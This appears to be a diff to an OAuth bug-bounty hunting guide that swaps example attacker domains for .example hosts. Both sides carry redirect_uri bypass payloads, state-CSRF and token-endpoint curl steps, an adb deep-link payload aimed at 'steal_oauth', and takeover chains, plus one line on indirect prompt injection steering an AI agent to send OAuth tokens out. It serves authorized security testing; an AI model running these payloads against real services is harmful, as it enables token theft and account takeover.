@@ -85,10 +85,10 @@ intent://
    - Capture the callback: note where tokens/codes land, what validates state/nonce
 
 3. **Test `redirect_uri` validation (highest yield)**
-   - Try exact host bypass: `redirect_uri=https://legit.com.evil.com`
+   - Try exact host bypass: `redirect_uri=https://legit.com.evil.example`
    - Try path traversal: `redirect_uri=https://legit.com/callback/../../../evil`
    - Try open redirects on the legitimate domain first, then chain into OAuth
-   - Try parameter pollution: `redirect_uri=https://legit.com&redirect_uri=https://evil.com`
+   - Try parameter pollution: `redirect_uri=https://legit.com&redirect_uri=https://evil.example`
    - Try encoded characters: `%2F`, `%40`, `%23` to confuse parsers
 
 4. **Test `state` parameter (CSRF)**
@@ -131,40 +131,40 @@ intent://
 ### redirect_uri Bypass Payloads
 ```
 # Host confusion
-https://evil.com#legit.com
-https://legit.com.evil.com
-https://legit.com@evil.com
+https://evil.example#legit.com
+https://legit.com.evil.example
+https://legit.com@evil.example
 
 # Path traversal
-https://legit.com/oauth/callback/../../redirect?url=https://evil.com
+https://legit.com/oauth/callback/../../redirect?url=https://evil.example
 
 # Open redirect chain (find open redirect on legit domain first)
-https://legit.com/logout?next=https://evil.com
+https://legit.com/logout?next=https://evil.example
 
 # Parameter pollution
-?redirect_uri=https://legit.com/cb&redirect_uri=https://evil.com/cb
+?redirect_uri=https://legit.com/cb&redirect_uri=https://evil.example/cb
 
 # URL encoded slashes
-https://legit.com%2F@evil.com
-https://legit.com%252F..%252F..evil.com
+https://legit.com%2F@evil.example
+https://legit.com%252F..%252F..evil.example
 ```
 
 ### State CSRF Test
 ```bash
 # Step 1: Initiate OAuth flow, capture state value
 # Step 2: Drop request, use attacker account's link with victim's session
-curl -v "https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com/cb&response_type=code&state=FIXED_VALUE"
+curl -v "https://target.example/oauth/authorize?client_id=APP&redirect_uri=https://target.example/cb&response_type=code&state=FIXED_VALUE"
 
 # Step 3: Force victim to visit callback with attacker's code + fixed state
-https://target.com/oauth/callback?code=ATTACKER_CODE&state=FIXED_VALUE
+https://target.example/oauth/callback?code=ATTACKER_CODE&state=FIXED_VALUE
 ```
 
 ### Nonce Extraction via Referrer
 ```bash
 # After OAuth callback landing page, check outbound requests
 # Look for Referer header containing access_token or code
-curl -v "https://target.com/auth/callback?code=ABC&state=XYZ" \
-  -H "Referer: https://evil.com" \
+curl -v "https://target.example/auth/callback?code=ABC&state=XYZ" \
+  -H "Referer: https://evil.example" \
   --max-redirs 0
 
 # Grep JS for outbound calls made on callback page
@@ -175,25 +175,25 @@ grep -r "fetch\|XMLHttpRequest\|img.src\|script.src" callback_page.html
 ```bash
 # ADB exploit for push_notification_webview deeplink
 adb shell am start -a android.intent.action.VIEW \
-  -d "target-app://push_notification_webview?url=https://evil.com/steal_oauth"
+  -d "target-app://push_notification_webview?url=https://evil.example/steal_oauth"
 
 # Craft intent URI for web-based exploit
-<a href="intent://push_notification_webview?url=https://evil.com#Intent;scheme=target-app;package=com.target.app;end">Click</a>
+<a href="intent://push_notification_webview?url=https://evil.example#Intent;scheme=target-app;package=com.target.app;end">Click</a>
 ```
 
 ### Token Endpoint Auth Bypass
 ```bash
 # Test unauthenticated token exchange (skip email verification)
-curl -X POST https://target.com/oauth/token \
+curl -X POST https://target.example/oauth/token \
   -d "grant_type=authorization_code" \
   -d "code=CAPTURED_CODE" \
   -d "client_id=CLIENT_ID" \
   -d "redirect_uri=https://legit.com/callback"
 
 # Test with unverified account credentials
-curl -X POST https://target.com/oauth/token \
+curl -X POST https://target.example/oauth/token \
   -d "grant_type=password" \
-  -d "username=unverified@evil.com" \
+  -d "username=unverified@evil.example" \
   -d "password=password123" \
   -d "client_id=CLIENT_ID"
 ```
@@ -209,7 +209,7 @@ grep -r "intent://\|deeplink\|scheme://" .
 # Filter: Response contains "access_token" OR "code=" in Location header
 
 # Check .well-known
-curl https://target.com/.well-known/openid-configuration | python3 -m json.tool
+curl https://target.example/.well-known/openid-configuration | python3 -m json.tool
 ```
 
 ### OIDC Discovery & Dynamic Registration Abuse
@@ -269,7 +269,7 @@ curl -v "https://idp/authorize?client_id=APP&redirect_uri=https://app/cb&respons
 ### Defender: Exact-match `redirect_uri` whitelist
 **Bypass:** Find an open redirect on the whitelisted domain itself, then use that URL as the redirect_uri. The OAuth server validates the registered domain ✓, but the open redirect bounces the code/token to attacker.
 ```
-redirect_uri=https://legit.com/logout?next=https://evil.com
+redirect_uri=https://legit.com/logout?next=https://evil.example
 ```
 
 ### Defender: `state` parameter required
@@ -279,7 +279,7 @@ redirect_uri=https://legit.com/logout?next=https://evil.com
 **Bypass:** Fragment isn't sent in `Referer` by browsers, but JavaScript on the callback page may read `window.location.hash` and pass it to analytics or postMessage to a parent frame. Intercept postMessage handlers.
 
 ### Defender: Host validation on mobile deep links
-**Bypass:** Try URL encoding (`https%3A//evil.com`), double encoding, Unicode normalization, or null bytes to confuse the validator while the underlying webview still navigates correctly.
+**Bypass:** Try URL encoding (`https%3A//evil.example`), double encoding, Unicode normalization, or null bytes to confuse the validator while the underlying webview still navigates correctly.
 
 ### Defender: Short-lived authorization codes
 **Bypass:** Referrer leakage and open redirects work even with short-lived codes if the attacker has a fast receiver. For CSRF, the victim completes the flow so timing is less critical.
@@ -344,7 +344,7 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 
 14. **Slack — OAuth2 redirect_uri bypass (domain-suffix)** ([H1 #2575](https://hackerone.com/reports/2575))
     - Subclass: `redirect_uri` validation bypass via domain-suffix / subdomain confusion
-    - Payload: redirect_uri using a domain that suffix-matched the registered host (e.g., `slack.com.attacker.com`) defeated the suffix-only check
+    - Payload: redirect_uri using a domain that suffix-matched the registered host (e.g., `slack.com.attacker.example`) defeated the suffix-only check
     - Root cause: `endsWith()` / suffix-match instead of strict host equality
     - Disclosure: 2013 (foundational case still cited in modern OAuth training material) — Slack public bounty
 
@@ -392,11 +392,11 @@ A server-side prefix-match flaw on `redirect_uri` is **necessary but not suffici
 
 | Server `redirect_uri` validator | Attack URL | Server `startswith()` | Browser actual host | Exploit? |
 |---|---|---|---|---|
-| prefix = `https://acme.example` (no slash) | `https://acme.example@evil.com/cb` | passes | evil.com (per WHATWG URL parsing — `@` is the userinfo delimiter, BEFORE the first `/` after `://`) | **YES** |
-| prefix = `https://acme.example/` (trailing slash) | `https://acme.example/@evil.com/cb` | passes | **acme.example** (the `@` is now AFTER the first `/`, so WHATWG parses it as a path character) | **NO** — browser stays on acme.example |
-| prefix = `https://acme.example` (substring match) | `https://acme.example.evil.com/cb` | passes | acme.example.evil.com (subdomain extension — the `.evil.com` extends the host) | **YES** |
-| prefix = `https://acme.example/` (trailing slash, server normalizes `..`) | `https://acme.example/../../@evil.com/cb` | passes raw startswith | acme.example (server normalizes path; even if it didn't, browser path-normalizes too) | usually **NO** |
-| prefix = `https://acme.example/` (Chromium-specific) | `https://acme.example/\@evil.com/cb` | passes | host depends — Chromium converts `\` to `/` so this becomes `https://acme.example//@evil.com/cb` and stays on acme.example | usually **NO** |
+| prefix = `https://acme.example` (no slash) | `https://acme.example@evil.example/cb` | passes | evil.example (per WHATWG URL parsing — `@` is the userinfo delimiter, BEFORE the first `/` after `://`) | **YES** |
+| prefix = `https://acme.example/` (trailing slash) | `https://acme.example/@evil.example/cb` | passes | **acme.example** (the `@` is now AFTER the first `/`, so WHATWG parses it as a path character) | **NO** — browser stays on acme.example |
+| prefix = `https://acme.example` (substring match) | `https://acme.example.evil.example/cb` | passes | acme.example.evil.example (subdomain extension — the `.evil.example` extends the host) | **YES** |
+| prefix = `https://acme.example/` (trailing slash, server normalizes `..`) | `https://acme.example/../../@evil.example/cb` | passes raw startswith | acme.example (server normalizes path; even if it didn't, browser path-normalizes too) | usually **NO** |
+| prefix = `https://acme.example/` (Chromium-specific) | `https://acme.example/\@evil.example/cb` | passes | host depends — Chromium converts `\` to `/` so this becomes `https://acme.example//@evil.example/cb` and stays on acme.example | usually **NO** |
 
 **Operational rule:** the WHATWG URL parser (used by all modern browsers since 2018) does userinfo parsing ONLY in the authority section — i.e., **before the first `/` after `://`**. Once the path begins, `@` is just a character. Server-side string-startswith checks don't model this — they pass URLs the browser will then route to the legitimate host.
 
@@ -406,9 +406,9 @@ A server-side prefix-match flaw on `redirect_uri` is **necessary but not suffici
 
 ## Related Skills & Chains
 
-- **`hunt-subdomain`** — The single highest-impact OAuth chain. Chain primitive: OAuth `redirect_uri` validator accepts any `*.target.com` subdomain + recon reveals `dev-staging.target.com` CNAMEs to a deprovisioned Heroku/S3/Azure app → claim the dangling subdomain → host an OAuth callback receiver there → craft `/oauth/authorize?redirect_uri=https://dev-staging.target.com/cb` → victim clicks → auth code lands on attacker-claimed subdomain → exchange for token → ATO. The redirect_uri whitelist passed because the subdomain is "legitimately" under target.com control.
-- **`hunt-ato`** — OAuth state-CSRF is the textbook ATO-via-account-linking primitive. Chain primitive: `state` parameter absent or not session-bound + victim is already logged into target.com + attacker initiates OAuth flow from their own account, captures `code` before exchange + crafts callback URL with attacker's code → forces victim to visit → victim's target.com session is now linked to attacker's Google/Facebook identity → attacker logs in via Google → owns victim's account.
+- **`hunt-subdomain`** — The single highest-impact OAuth chain. Chain primitive: OAuth `redirect_uri` validator accepts any `*.target.example` subdomain + recon reveals `dev-staging.target.example` CNAMEs to a deprovisioned Heroku/S3/Azure app → claim the dangling subdomain → host an OAuth callback receiver there → craft `/oauth/authorize?redirect_uri=https://dev-staging.target.example/cb` → victim clicks → auth code lands on attacker-claimed subdomain → exchange for token → ATO. The redirect_uri whitelist passed because the subdomain is "legitimately" under target.example control.
+- **`hunt-ato`** — OAuth state-CSRF is the textbook ATO-via-account-linking primitive. Chain primitive: `state` parameter absent or not session-bound + victim is already logged into target.example + attacker initiates OAuth flow from their own account, captures `code` before exchange + crafts callback URL with attacker's code → forces victim to visit → victim's target.example session is now linked to attacker's Google/Facebook identity → attacker logs in via Google → owns victim's account.
 - **`hunt-llm-ai`** — Modern OAuth flows for AI agents (ChatGPT plugins, Claude MCP servers, agentic copilots) reuse OAuth 2.1 + PKCE. Chain primitive: agentic AI accepts `redirect_uri` from indirect prompt-injection in a document → model crafts OAuth authorize URL with attacker callback → user clicks "approve" thinking it's the agent's own flow → tokens exfiltrated via tool-use to attacker domain.
 - **`hunt-saml`** — When OAuth is layered atop a SAML IdP, the IdP-level XSW becomes the OAuth ATO path. Chain primitive: SAML SP that issues OAuth tokens after assertion-validation + XSW attack on the assertion alters `NameID` to admin user → SP issues OAuth token bearing admin identity → OAuth-scoped APIs grant admin access.
-- **`security-arsenal`** — Pull the OAuth `redirect_uri` Bypass Table (host-confusion `legit.com@evil.com`, `legit.com.evil.com`, path-traversal, parameter pollution, encoded-slash `%2F`, fragment-injection `#legit.com`) and the open-redirect chain catalog when exact-match validation forces you to find an open-redirect on the whitelisted domain first.
+- **`security-arsenal`** — Pull the OAuth `redirect_uri` Bypass Table (host-confusion `legit.com@evil.example`, `legit.com.evil.example`, path-traversal, parameter pollution, encoded-slash `%2F`, fragment-injection `#legit.com`) and the open-redirect chain catalog when exact-match validation forces you to find an open-redirect on the whitelisted domain first.
 - **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an OAuth "open redirect" that doesn't actually leak a token (only the `state` param, or the callback page doesn't include credentials in URL). State-only leakage is Low; token/code leakage with successful exchange demonstration is Critical. The exchange-the-code step is non-negotiable.
